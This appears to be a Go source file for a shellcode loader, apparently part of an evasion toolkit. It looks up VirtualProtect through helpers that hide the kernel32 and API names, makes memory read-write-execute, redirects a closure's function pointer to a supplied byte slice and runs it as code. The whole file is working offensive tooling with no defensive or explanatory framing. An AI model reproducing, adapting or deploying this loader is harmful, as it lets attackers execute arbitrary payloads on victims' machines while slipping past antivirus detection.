package loader

import (
	"upx/utils"
	"unsafe"
)

func virProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := utils.GetProc(utils.GetKe32DllName(), utils.GetVirProtectName()).Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func RunVirProtect(sc []byte) {
	f := func() {}
	var oldfperms uint32
	if !virProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call failed!")
	}
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
	var oldcodeperms uint32
	if !virProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldcodeperms)) {
		panic("Call failed!")
	}
	f()
}
